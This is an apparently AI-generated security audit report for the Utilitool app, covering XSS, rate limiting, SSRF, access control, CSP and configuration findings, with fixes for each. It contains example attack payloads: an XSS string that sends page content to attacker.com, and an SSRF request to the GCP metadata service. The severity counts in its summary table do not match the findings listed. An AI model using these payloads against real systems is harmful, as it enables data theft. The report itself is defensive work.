# Security Audit Report — Utilitool

**Date:** 2026-05-19  
**Scope:** API (`api/functions/src/`) + UI (`ui/src/`)  
**Status:** Development Phase — Breaking Changes Acceptable

---

## Summary by Severity

| Severity | Count | Top Issues |
|----------|-------|-----------|
| **🔴 HIGH** | 2 | Stored XSS in print receipts; Rate limiting non-functional |
| **🟠 MEDIUM** | 4 | SSRF in OCR; No RBAC; Client-side auth guard; No CSP; Hardcoded API URL |
| **🟡 LOW** | 5 | Incomplete HTML stripping; Body logging in staging; Data leak in error; Firebase error messages; Missing env vars |
| **ℹ️ INFO** | 3 | Unused JWT_SECRET; Hardcoded Firebase config; Unprotected Swagger |

---

## HIGH SEVERITY

### 🔴 H1: Stored XSS via `document.write` in Billing Print Receipt
**Impact:** Critical — Arbitrary JavaScript execution in print window  
**Location:** `ui/src/routes/(app)/billings/+page.svelte:194-254`  
**Details:**
- The `printReceipts()` function concatenates unsanitized API data (`room_name`, `qr_payment_url`, tenant names) directly into an HTML string
- Passed to `printWindow.document.write(htmlString)`, which parses it as executable HTML
- Any API-sourced field containing `<script>`, `<img onerror=`, or quote-breaking characters causes stored XSS

**Example Attack:**
```
room_name: "<img src=x onerror=fetch('https://attacker.com?data='+document.body.innerHTML)>"
```
**Solution:**
- Create HTML escape utility
- Apply to all interpolated values
- Validate `qr_payment_url` starts with `https://` before rendering

---

### 🔴 H2: Rate Limiting Non-Functional in Production
**Impact:** High — Brute-force attacks bypass protection at scale  
**Location:** `api/functions/src/config/rate-limit.config.ts`  
**Details:**
- Uses in-memory `MemoryStore` (per-process)
- Firebase Functions scales to multiple instances (`maxInstances: 2`)
- Each instance has an independent counter: attacker gets `2 × limit` attempts
- Auth brute-force protection completely ineffective

**Current Limits:**
- `/auth` routes: 20 requests/15 min per IP per **instance**
- Global API: 100 requests/15 min per IP per **instance**

**Solution:**
- Replace MemoryStore with Redis-backed rate limiter (`rate-limit-redis`)
- Fill in empty `api/functions/src/config/redis.config.ts`
- Interim option: Move auth throttling to Firestore (write `loginAttempts` doc, check before Firebase Auth sign-in)

---

## MEDIUM SEVERITY

### 🟠 M1: Server-Side Request Forgery (SSRF) in OCR Endpoint
**Impact:** High — Cloud credential exfiltration  
**Location:** `api/functions/src/lib/gemini.lib.ts:124`  
**Details:**
- OCR endpoint validates only that `image_url` is a valid URL
- Raw `fetch(imageUrl)` with no IP/hostname validation
- Attacker can supply GCP metadata service URL: `http://metadata.google.internal/computeMetadata/v1/...`
- Or internal RFC-1918 IPs to access private services

**Example Attack:**
```ts
POST /bills/ocr
{ "image_url": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity?audience=https://firestore.googleapis.com" }
```

**Solution:**
- Resolve hostname, block private IP ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 127.0.0.0/8, 169.254.0.0/16)
- Allowlist only known origins (e.g., `storage.googleapis.com`)
- Or: Remove URL fetch entirely — require direct multipart file upload instead

---

### 🟠 M2: No Role-Based Access Control (RBAC) Enforcement
**Impact:** Medium — Privilege escalation / data leakage  
**Location:**
- `api/functions/src/features/auth/auth.model.ts` — `role` field defined
- `api/functions/src/features/auth/auth.service.ts:17` — auto-assigned `'admin'` role
- `api/functions/src/middlewares/auth.middleware.ts` — no role-checking middleware

**Details:**
- Role field exists on User (`'admin' | 'landlord' | 'assistant'`) but is never checked
- Every authenticated user has full CRUD access to all resources
- New users default to `'admin'` role (should be `'landlord'`)
- A landlord should not delete tenants from other properties

**Solution:**
- Create `requireRole(...roles: Role[])` middleware
- Read `req.user.role` and throw 403 if not in allowed list
- Change default new-user role from `'admin'` to `'landlord'`
- Apply middleware to destructive/admin-only routes

---

### 🟠 M3: Auth Guard is Client-Side Only (No Server-Side Redirect)
**Impact:** Medium — Protected content briefly accessible to unauthenticated users  
**Location:**
- `ui/src/routes/(app)/+layout.ts` — `export const ssr = false;` (disables SSR)
- `ui/src/routes/(app)/+layout.svelte:20-24` — `$effect(() => goto('/login'))`

**Details:**
- Auth enforcement happens in a Svelte `$effect` (client-side)
- No server-side redirect or session validation
- Page HTML is sent to browser unconditionally
- Protected content is briefly visible during hydration before effect fires
- Race condition: if auth library is not yet initialized, no redirect happens

**Solution:**
- Add server-side load function: `ui/src/routes/(app)/+layout.server.ts`
- Or: Keep `$effect` but wrap `<slot />` in `{#if authState.isAuthenticated}` conditional so content doesn't render until auth is confirmed

---

### 🟠 M4: No Content Security Policy (CSP)
**Impact:** Medium — No browser-enforced XSS mitigation  
**Location:** `ui/src/app.html` (no CSP meta tag or headers)  
**Details:**
- If XSS is achieved (see H1), no browser restrictions on:
  - Network requests (data exfiltration)
  - Local storage access
  - Cookie theft
  - DOM manipulation

**Solution:**
- Create `ui/src/hooks.server.ts` with CSP header:
```ts
response.headers.set('Content-Security-Policy',
  "default-src 'self'; script-src 'self'; connect-src 'self' https://*.googleapis.com https://*.firebaseapp.com; img-src 'self' data: https:; style-src 'self' 'unsafe-inline';"
);
```
- Tune after testing (Firebase SDK may need additional `connect-src` origins)

---

### 🟠 M5: Hardcoded API URL (`http://localhost:5002`)
**Impact:** Medium — Production builds misdirect all API traffic  
**Location:** `ui/src/lib/api/client.ts:4`  
**Details:**
```ts
const API_BASE_URL = 'http://localhost:5002'
```
- All API requests hardcoded to localhost
- Vercel staging/production builds still target `localhost:5002` on user's machine
- API requests silently fail or hit a rogue local service if running on that port
- No environment-based configuration

**Solution:**
- Use environment variable:
```ts
const API_BASE_URL = import.meta.env.PUBLIC_API_BASE_URL ?? 'http://localhost:5002';
```
- Add to `ui/.env.staging`: `PUBLIC_API_BASE_URL=https://staging-api.utilitool.app`
- Add to `ui/.env.production`: `PUBLIC_API_BASE_URL=https://api.utilitool.app`

---

## LOW SEVERITY

### 🟡 L1: HTML Stripping Incomplete
**Location:**
- `api/functions/src/utils/sanitize.util.ts` — `stripHtml` utility exists
- `api/functions/src/features/billing/billing.dto.ts` — does NOT use it
- `api/functions/src/features/reading/reading.dto.ts` — does NOT use it

**Details:**
- `stripHtml` is applied to meter-group, property, tenant name fields
- Not applied to billing/reading DTOs, leaving those fields unescaped
- Basic regex approach (`/<[^>]*>/g`) — defense-in-depth only, not primary XSS prevention

**Solution:**
- Apply `.transform(stripHtml)` to all string fields in billing/reading DTOs
- Or: Centralize at middleware level (recursively strip HTML from all string request body values)

---

### 🟡 L2: Request Body Logged in Staging
**Location:** `api/functions/src/middlewares/request-logger.middleware.ts:14-19`  
**Details:**
```ts
if (process.env.NODE_ENV !== "production") {
  console.log('Request body:', req.body);  // Logs in dev AND staging
}
```
- Staging uses `NODE_ENV=staging` (not `"production"`)
- Full request bodies logged to stdout, including PII, passwords, sensitive fields
- Firebase Function logs are persisted and searchable

**Solution:**
- Change condition: `process.env.NODE_ENV !== 'production' && process.env.APP_ENV !== 'staging'`
- Or: Remove body logging entirely; log only method/path/status/duration

---

### 🟡 L3: Consumption Values Leaked in Billing Cycle Error
**Location:** `api/functions/src/features/billing-cycle/billing-cycle.validator.ts:35-38`  
**Details:**
```
"Consumption mismatch: calculated 1234.56 differs from expected 1200.00 by 2.9%"
```
- Error message exposes exact stored numeric values
- Authenticated user can probe database via invalid API calls
- Low risk (requires auth) but unnecessary information disclosure

**Solution:**
- Generic message: `"Consumption mismatch exceeds the allowed 3% tolerance."`

---

### 🟡 L4: Raw Firebase Error Messages Shown in Login UI
**Location:** `ui/src/routes/(auth)/login/+page.svelte:26`  
**Details:**
```ts
} catch (err) {
  error = err.message;  // Shows "auth/too-many-requests", "auth/user-disabled", etc.
}
```
- Firebase SDK error codes/messages shown directly to user
- Leaks implementation details (e.g., confirms user exists if 'user-disabled')

**Solution:**
- Map Firebase error codes to friendly messages:
```ts
const firebaseMessages: Record<string, string> = {
  'auth/too-many-requests': 'Too many attempts. Please wait and try again.',
  'auth/user-disabled': 'This account has been disabled.',
};
error = firebaseMessages[err.code] ?? 'An unexpected error occurred. Please try again.';
```

---

### 🟡 L5: Missing `ALLOWED_ORIGINS` Environment Variable
**Location:** `api/functions/src/config/cors.config.ts`  
**Details:**
- If `ALLOWED_ORIGINS` env var not set, `productionOrigins = []` (empty array)
- In production mode, all cross-origin requests blocked (no origin in allowlist)
- In staging, behavior may be incorrect due to missing config

**Solution:**
- Add to `.env.staging`: `ALLOWED_ORIGINS=https://utilitool.vercel.app,https://staging-utilitool.vercel.app`
- Add to `.env.production`: `ALLOWED_ORIGINS=https://utilitool.app`
- Document required env var in `API_SETUP.md`

---

### 🟡 L6: No Request Timeout on UI Fetch Calls
**Location:** `ui/src/lib/api/client.ts`  
**Details:**
- No `AbortSignal` timeout on `fetch()` calls
- Stalled API server can leave requests hanging indefinitely
- Resource exhaustion / UX degradation

**Solution:**
- Add to all fetch calls: `signal: AbortSignal.timeout(30_000)` (30 seconds)
- Or create wrapper utility that applies timeout automatically

---

## INFORMATIONAL

### ℹ️ I1: Unused `JWT_SECRET` Environment Variable
**Location:** `api/functions/secrets/.env.dev`, `.env.staging`, `.env.prod`  
**Details:**
- `JWT_SECRET` defined in all env files with placeholder values
- No code path reads or uses this variable
- Authentication uses Firebase `verifyIdToken` (Firebase-issued tokens), not custom JWT
- Variable is a remnant from previous implementation

**Solution:**
- Remove `JWT_SECRET` from all `.env.*` files and `.env.example`

---

### ℹ️ I2: Firebase Config Hardcoded in Source (Not Environment-Based)
**Location:** `ui/src/lib/firebase.ts:7-12`  
**Details:**
```ts
const firebaseConfig = {
  apiKey: "AIzaSyARyG7a-_iElSs7yMj8NuFgYtPWPKVQxR0",
  appId: "1:174182910662:web:8d557f533b186b4b8e65c7",
  // ... hardcoded verbatim
}
```
- Firebase API keys are **intentionally public** (Firebase security model relies on Auth + Rules, not key secrecy)
- Hardcoding prevents environment-based config switching
- Build process cannot swap config for staging vs. production without editing source

**Solution:**
- Read from `import.meta.env.PUBLIC_FIREBASE_*` variables
- Define `PUBLIC_FIREBASE_API_KEY`, etc. in `.env.staging` and `.env.production`

---

### ℹ️ I3: Swagger `/docs` Endpoint Unprotected
**Location:** `api/functions/src/index.ts`  
**Details:**
- Swagger UI accessible without authentication during development
- Intentional design (noted in code comments)
- Acceptable for internal development tool

**Consideration for Production:**
- Gate behind `authMiddleware`
- Restrict by IP whitelist
- Remove entirely from production builds
- Or use API key-based docs access

---

## Critical Path Forward

**Immediate (Before Any Deployment):**
1. Fix H1 (XSS in print receipts)
2. Fix H2 (Rate limiting)
3. Fix M5 (Hardcoded API URL)

**Before Staging:**
4. Fix M1 (SSRF)
5. Fix M2 (RBAC)
6. Fix M3 (Auth guard)
7. Fix M4 (CSP)

**Nice-to-Have Before Release:**
8. L1–L6 fixes
9. I1–I3 cleanup

---

## Architecture Notes

### Authentication Model
- Uses **Firebase Auth** (Google-managed), not custom JWT
- Frontend stores tokens in Firebase SDK's managed storage (indexedDB by default)
- Backend validates tokens via `admin.auth().verifyIdToken(token)`
- This model is cryptographically sound; the findings are about enforcement, not the auth mechanism itself

### Firestore Access Pattern
- Backend-only — all Firestore reads/writes via Express API
- Client-side never reads Firestore directly
- No client-side Firestore security rules required
- Correct architecture for zero-trust security

### Multi-Instance Firebase Functions
- API can scale to 2+ Cloud Function instances
- Rate limiting, caching, and state must be centralized (Redis or Firestore), not in-memory
- File uploads, sessions, and rate limits all affected by this multi-instance reality

---

## Files Requiring Changes

| File | Change | Severity |
|------|--------|----------|
| `ui/src/routes/(app)/billings/+page.svelte` | Escape HTML in `printReceipts()` | H1 |
| `api/functions/src/config/rate-limit.config.ts` | Implement Redis-backed limiter | H2 |
| `ui/src/lib/api/client.ts` | Use env var for API URL | M5 |
| `ui/.env.staging`, `ui/.env.production` | Add API URL env vars | M5 |
| `api/functions/src/lib/gemini.lib.ts` | Add IP block-list before fetch | M1 |
| `api/functions/src/middlewares/auth.middleware.ts` | Add `requireRole()` middleware | M2 |
| `api/functions/src/features/auth/auth.service.ts` | Change default role to `'landlord'` | M2 |
| `ui/src/routes/(app)/+layout.svelte` | Wrap slot in auth check | M3 |
| `ui/src/hooks.server.ts` | Create with CSP header | M4 |
| `api/functions/src/middlewares/request-logger.middleware.ts` | Exclude staging from body logs | L2 |
| `api/functions/src/features/billing-cycle/billing-cycle.validator.ts` | Generic error message | L3 |
| `ui/src/routes/(auth)/login/+page.svelte` | Map Firebase errors | L4 |

---

## Testing the Fixes

- **H1:** Submit `room_name: "<img src=x onerror=alert(1)>"` via API, trigger print → no alert
- **H2:** Exceed rate limit, check for 429 response
- **M1:** POST OCR with `http://metadata.google.internal/...` → 400 response
- **M2:** Create assistant user, attempt DELETE → 403 response
- **M3:** Visit protected route unauthenticated → no page content visible
- **M4:** Check DevTools Security tab → CSP header present
- **M5:** Build for staging, inspect bundle → no `localhost:5002` string

---

**Report Generated:** 2026-05-19  
**Next Steps:** Review plan in `/CLAUDE/plans/review-the-current-security-polished-glacier.md` for implementation details.
